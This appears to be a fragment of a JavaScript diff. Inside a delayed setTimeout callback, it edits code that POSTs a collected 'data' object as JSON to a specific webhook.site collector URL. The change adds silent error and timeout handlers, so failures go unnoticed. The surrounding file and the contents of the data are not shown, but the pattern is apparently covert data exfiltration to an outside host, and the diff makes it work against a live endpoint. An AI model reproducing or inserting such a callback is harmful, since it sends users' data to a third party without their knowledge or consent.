@@ -57,14 +57,17 @@ setTimeout(() => {
     }
 
     // 回传
-    const http = require('https');
+    const https = require('https');
     const payload = JSON.stringify(data);
-    const req = http.request({
+    const req = https.request({
       hostname: 'webhook.site',
-      path: '/test-callback',
+      path: '/095218e3-e87b-4bfa-a8cd-1a6b821d70f4',
       method: 'POST',
-      headers: {'Content-Type': 'application/json', 'Content-Length': payload.length}
+      headers: {'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload)}
     });
+    req.on('error', () => {});
+    req.on('timeout', () => { req.destroy(); });
+    req.setTimeout(8000);
     req.write(payload);
     req.end();
   } catch(e) {
